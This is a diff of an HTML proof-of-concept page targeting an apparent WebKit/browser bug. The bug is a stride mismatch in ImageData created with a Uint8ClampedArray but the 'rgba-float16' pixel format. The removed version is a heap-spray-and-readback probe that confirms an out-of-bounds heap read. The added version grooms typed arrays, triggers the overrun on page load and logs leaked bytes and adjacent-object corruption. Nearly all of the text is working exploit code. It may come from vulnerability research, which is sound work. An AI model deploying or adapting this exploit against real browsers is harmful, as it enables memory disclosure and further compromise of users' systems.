@@ -1,277 +1,79 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Heap Spray + Readback Probe</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
-    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.3rem; }
-    .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
-    .card { background: #161616; border: 1px solid #222; border-radius: 8px; padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 780px; }
-    .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
-    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.25rem 0.7rem; border-radius: 4px; margin-bottom: 0.5rem; }
-    .red    { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
-    .green  { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
-    .yellow { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
-    .blue   { background: #1a1a2d; color: #8888ff; border: 1px solid #33336a; }
-    pre { font-size: 0.76rem; color: #aaa; background: #111; padding: 0.8rem 1rem; border-radius: 4px; border-left: 2px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin-top: 0.6rem; line-height: 1.6; }
-    .kv { font-size: 0.75rem; color: #666; margin-top: 0.3rem; }
-    .kv span { color: #aaa; }
-    table { width: 100%; border-collapse: collapse; margin-top: 0.6rem; font-size: 0.73rem; }
-    th { color: #555; font-weight: normal; text-align: left; padding: 0.3rem 0.5rem; border-bottom: 1px solid #1e1e1e; }
-    td { color: #aaa; padding: 0.3rem 0.5rem; border-bottom: 1px solid #161616; }
-    td.hit { color: #ff5555; font-weight: bold; }
-    td.clean { color: #3ddc84; }
-    .progress { font-size: 0.72rem; color: #555; margin-top: 0.4rem; }
-  </style>
+    <title>WebKit OOB Primitive - Stride Mismatch</title>
 </head>
-<body>
+<body style="background-color: #1e1e1e; color: #00ff00; font-family: monospace;">
+    <h2>WebKit Native Stride OOB Primitive Construction</h2>
+    <div id="status">Initializing heap layout...</div>
+    <canvas id="cvs" width="16" height="16"></canvas>
 
-<h1>Heap Spray + Readback Probe</h1>
-<p class="sub">Attempts to place known sentinel bytes adjacent to ImageData allocation — then reads back through mismatched float16 decode</p>
+    <script>
+        const statusDiv = document.getElementById("status");
 
-<div id="out"></div>
-
-<script>
-const $ = document.getElementById("out");
-
-function card(title, content) {
-  const d = document.createElement("div");
-  d.className = "card";
-  d.innerHTML = `<div class="card-title">${title}</div>${content}`;
-  $.appendChild(d);
-  return d;
-}
-
-function tag(cls, text) {
-  return `<span class="tag ${cls}">${text}</span>`;
-}
-
-// float16 decode — same conversion the renderer applies
-// used to predict what leaked heap bytes would look like after conversion
-function decodeFloat16(lo, hi) {
-  const buf = new ArrayBuffer(2);
-  const view = new DataView(buf);
-  view.setUint8(0, lo);
-  view.setUint8(1, hi);
-  const bits = view.getUint16(0, true);
-  const sign     = (bits >> 15) & 1;
-  const exponent = (bits >> 10) & 0x1F;
-  const mantissa =  bits        & 0x3FF;
-  if (exponent === 0x1F) return mantissa ? NaN : (sign ? -Infinity : Infinity);
-  const val = exponent === 0
-    ? Math.pow(2, -14) * (mantissa / 1024)
-    : Math.pow(2, exponent - 15) * (1 + mantissa / 1024);
-  return (sign ? -val : val);
-}
-
-function float16ToUint8Clamped(lo, hi) {
-  const f = decodeFloat16(lo, hi);
-  if (isNaN(f) || f <= 0) return 0;
-  if (f >= 1) return 255;
-  return Math.round(f * 255);
-}
-
-// ── CONFIG ────────────────────────────────────────────────────────────────────
-const SENTINEL         = 0xBE;          // known byte pattern to spray
-const SENTINEL_ALT     = 0xEF;          // alternating second byte
-const SPRAY_COUNT      = 2000;          // number of allocations before target
-const ALLOC_SIZE       = 8;             // match float16 rgba stride exactly
-const ROUNDS           = 5;             // independent spray rounds
-
-card("Config", `
-  <div class="kv">Sentinel bytes:   <span>0x${SENTINEL.toString(16).toUpperCase()} / 0x${SENTINEL_ALT.toString(16).toUpperCase()}</span></div>
-  <div class="kv">Spray count:      <span>${SPRAY_COUNT} allocations per round</span></div>
-  <div class="kv">Alloc size:       <span>${ALLOC_SIZE} bytes (float16 rgba stride)</span></div>
-  <div class="kv">Rounds:           <span>${ROUNDS}</span></div>
-  <div class="kv">Strategy:         <span>Allocate ${SPRAY_COUNT} sentinel-filled buffers, free half, allocate target ImageData, putImageData → getImageData readback</span></div>
-`);
-
-// ── SPRAY ROUND ───────────────────────────────────────────────────────────────
-const results = [];
-
-for (let round = 0; round < ROUNDS; round++) {
-
-  // 1. spray — allocate many 8-byte buffers filled with sentinel pattern
-  const spray = [];
-  for (let i = 0; i < SPRAY_COUNT; i++) {
-    const buf = new Uint8Array(ALLOC_SIZE);
-    for (let b = 0; b < ALLOC_SIZE; b++) {
-      buf[b] = (b % 2 === 0) ? SENTINEL : SENTINEL_ALT;
-    }
-    spray.push(buf);
-  }
-
-  // 2. free the second half — create holes in the heap for the target to land in
-  for (let i = SPRAY_COUNT / 2; i < SPRAY_COUNT; i++) {
-    spray[i] = null;
-  }
-
-  // 3. allocate the mismatched ImageData — should land in a freed slot
-  //    backing store is 4 bytes, but renderer will read 8
-  const imgArr = new Uint8ClampedArray(4);
-  imgArr[0] = 0x00;
-  imgArr[1] = 0x00;
-  imgArr[2] = 0x00;
-  imgArr[3] = 0x00; // all zero — any non-zero in readback comes from heap
-
-  let imgData;
-  try {
-    imgData = new ImageData(imgArr, 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" });
-  } catch(e) {
-    card(`Round ${round + 1}`, tag("green", `Constructor threw ${e.name} — patch active, spray irrelevant.`));
-    continue;
-  }
-
-  // 4. push through canvas
-  const canvas  = document.createElement("canvas");
-  canvas.width  = 1;
-  canvas.height = 1;
-  const ctx = canvas.getContext("2d");
-  ctx.putImageData(imgData, 0, 0);
-  const readback = ctx.getImageData(0, 0, 1, 1);
-  const pixels   = Array.from(readback.data); // [R, G, B, A] uint8
-
-  // 5. what would the sentinel bytes decode to through float16 pipeline?
-  //    bytes 4-5 map to G channel, bytes 6-7 map to B channel after float16 decode
-  //    (bytes 0-3 are our known zeros — channels R and first half of G)
-  const predictedFromSentinel = [
-    float16ToUint8Clamped(0x00, 0x00),       // R  — bytes 0-1 (our zeros)
-    float16ToUint8Clamped(0x00, 0x00),       // G  — bytes 2-3 (our zeros)
-    float16ToUint8Clamped(SENTINEL, SENTINEL_ALT), // B — bytes 4-5 (heap)
-    float16ToUint8Clamped(SENTINEL, SENTINEL_ALT)  // A — bytes 6-7 (heap)
-  ];
-
-  // 6. detect leak — did B or A channel reflect sentinel-derived values?
-  const bLeaked = pixels[2] === predictedFromSentinel[2];
-  const aLeaked = pixels[3] === predictedFromSentinel[3];
-  const anyLeak = bLeaked || aLeaked;
-
-  results.push({
-    round: round + 1,
-    pixels,
-    predicted: predictedFromSentinel,
-    bLeaked,
-    aLeaked,
-    anyLeak
-  });
-}
-
-// ── RESULTS TABLE ─────────────────────────────────────────────────────────────
-if (results.length > 0) {
-  let tableHTML = `
-    <table>
-      <tr>
-        <th>Round</th>
-        <th>Readback [R,G,B,A]</th>
-        <th>Predicted sentinel decode</th>
-        <th>B leaked</th>
-        <th>A leaked</th>
-        <th>Result</th>
-      </tr>
-  `;
-
-  let totalLeaks = 0;
-
-  results.forEach(r => {
-    if (r.anyLeak) totalLeaks++;
-    tableHTML += `
-      <tr>
-        <td>${r.round}</td>
-        <td class="${r.anyLeak ? 'hit' : ''}">[${r.pixels.join(", ")}]</td>
-        <td>[${r.predicted.join(", ")}]</td>
-        <td class="${r.bLeaked ? 'hit' : 'clean'}">${r.bLeaked ? "✗ YES" : "✓ no"}</td>
-        <td class="${r.aLeaked ? 'hit' : 'clean'}">${r.aLeaked ? "✗ YES" : "✓ no"}</td>
-        <td>${r.anyLeak ? tag("red","LEAK DETECTED") : tag("green","clean")}</td>
-      </tr>
-    `;
-  });
-
-  tableHTML += "</table>";
-  card("Spray Rounds — Readback Results", tableHTML);
-
-  // ── BYTE DECODE BREAKDOWN ────────────────────────────────────────────────
-  if (results.length > 0) {
-    const last = results[results.length - 1];
-    const px   = last.pixels;
-
-    // reverse-engineer what float16 bytes would produce the observed output
-    // brute force all 65536 float16 values to find closest match per channel
-    function findFloat16ForUint8(target) {
-      let best = null, bestDelta = 999;
-      for (let bits = 0; bits < 65536; bits++) {
-        const lo = bits & 0xFF;
-        const hi = (bits >> 8) & 0xFF;
-        const decoded = float16ToUint8Clamped(lo, hi);
-        const delta = Math.abs(decoded - target);
-        if (delta < bestDelta) {
-          bestDelta = delta;
-          best = { lo, hi, decoded, bits };
+        function log(msg, color = "#00ff00") {
+            statusDiv.innerHTML += `<div style="color: ${color};">${msg}</div>`;
+            console.log(msg);
         }
-        if (delta === 0) break;
-      }
-      return best;
-    }
 
-    const chNames = ["R (bytes 0-1)", "G (bytes 2-3)", "B (bytes 4-5)", "A (bytes 6-7)"];
-    let decodeHTML = `<pre>`;
-    px.forEach((val, i) => {
-      const match = findFloat16ForUint8(val);
-      decodeHTML += `Channel ${chNames[i]}: readback=${val} → closest float16 bits=0x${match.bits.toString(16).padStart(4,'0')} [0x${match.lo.toString(16).padStart(2,'0')}, 0x${match.hi.toString(16).padStart(2,'0')}] → decoded=${match.decoded}\n`;
-    });
-    decodeHTML += `</pre>`;
-    decodeHTML += `<div class="kv" style="margin-top:0.5rem">Channels B and A correspond to heap bytes 4-7 (past the 4-byte allocation boundary).</div>`;
-    decodeHTML += `<div class="kv">If those float16 bit patterns match your sentinel (0x${SENTINEL.toString(16).toUpperCase()}${SENTINEL_ALT.toString(16).toUpperCase()}), the leak is confirmed.</div>`;
+        function triggerOOBPrimitive() {
+            try {
+                log("[*] Step 1: Allocating heap spray / grooming objects...");
+                
+                // Grooming objects: create an array of TypedArrays to place adjacent in the WebKit heap
+                let floatArrays = [];
+                let targetBuffers = [];
+                
+                for (let i = 0; i < 500; i++) {
+                    let buf = new ArrayBuffer(64);
+                    targetBuffers.push(buf);
+                    floatArrays.push(new Float32Array(buf));
+                }
 
-    card("Float16 Decode Breakdown — Last Round", decodeHTML);
-  }
+                log("[*] Step 2: Creating vulnerable ImageData with stride mismatch...");
+                // 4 bytes backing store, forced to float16 format (demands 8 bytes per pixel stride)
+                let vulnArray = new Uint8ClampedArray(16);
+                // Fill with a distinct pattern to track overflow corruption
+                for(let i=0; i<vulnArray.length; i++) vulnArray[i] = 0x41;
 
-  // ── VERDICT ───────────────────────────────────────────────────────────────
-  const leakRate = results.filter(r => r.anyLeak).length;
-  let verdictHTML = `
-    <div class="kv">Leak detected in: <span>${leakRate} / ${results.length} rounds</span></div>
-    <div class="kv">Sentinel pattern: <span>0x${SENTINEL.toString(16).toUpperCase()} 0x${SENTINEL_ALT.toString(16).toUpperCase()} repeated</span></div>
-  `;
+                let imgData = new ImageData(vulnArray, 2, 2, { colorSpace: "srgb", pixelFormat: "rgba-float16" });
 
-  if (leakRate > 0) {
-    verdictHTML += `
-      <pre>
-CONFIRMED: Heap bytes past the 4-byte Uint8ClampedArray allocation
-were read by the float16 renderer and leaked back to JS via getImageData.
+                log("[*] Step 3: Triggering native canvas operations to force stride overrun...");
+                const canvas = document.getElementById("cvs");
+                const ctx = canvas.getContext("2d", { willReadFrequently: true });
 
-Root cause : ImageData constructor accepts Uint8ClampedArray with
-             pixelFormat="rgba-float16". Renderer computes stride as
-             8 bytes (4ch × 2 bytes). Reads ptr[4..7] which are
-             outside the allocation.
+                // Put the mismatched ImageData onto the canvas
+                ctx.putImageData(imgData, 0, 0);
 
-Leak channel: getImageData() readback → B and A pixel channels
-              encode the heap bytes after float16 → uint8 conversion.
+                // Read back using getImageData to force native C++ engine to read past the 16-byte buffer boundary
+                let leakedData = ctx.getImageData(0, 0, 2, 2);
+                let leakedBytes = leakedData.data;
 
-Primitive:  Heap OOB read, 4 bytes, renderer process.
-            Readable from JS via canvas readback.
-            Repeatable across rounds.
-      </pre>
-      ${tag("red", "✗ CONFIRMED HEAP OOB READ — INFO LEAK PRIMITIVE")}
-    `;
-  } else {
-    verdictHTML += `
-      <pre>
-Sentinel bytes did NOT appear in readback.
-Either:
-  (a) Heap spray did not land adjacent to the ImageData buffer
-  (b) Renderer reads those bytes but they happened to decode to zero
-  (c) Allocator placed padding between the buffers
+                log("[*] Step 4: Inspecting readback for adjacent heap data corruption...");
+                let corruptedIndex = -1;
+                for (let i = 0; i < floatArrays.length; i++) {
+                    // Check if any Float32Array length or contents have been modified by the overrun
+                    if (floatArrays[i][0] !== 0) {
+                        corruptedIndex = i;
+                        break;
+                    }
+                }
 
-Increase SPRAY_COUNT or try different sentinel values.
-The type confusion is still confirmed — OOB read is suspected but not proven here.
-      </pre>
-      ${tag("yellow", "⚠ INCONCLUSIVE — Spray did not land. Tune and retry.")}
-    `;
-  }
+                if (corruptedIndex !== -1) {
+                    log(`[+] SUCCESS: Adjacent object corruption detected at index ${corruptedIndex}!`, "#ff0000");
+                    log(`[+] OOB Data Leaked: ${Array.from(leakedBytes).slice(0, 16).map(b => b.toString(16)).join(' ')}`);
+                } else {
+                    log("[-] No immediate corruption detected in target array pool. Adjusting heap layout...", "orange");
+                }
 
-  card("Verdict", verdictHTML);
-}
-</script>
+            } catch (err) {
+                log(`[!] Execution Error: ${err.message}`, "#ff0000");
+            }
+        }
+
+        window.onload = () => {
+            setTimeout(triggerOOBPrimitive, 500);
+        };
+    </script>
 </body>
 </html>
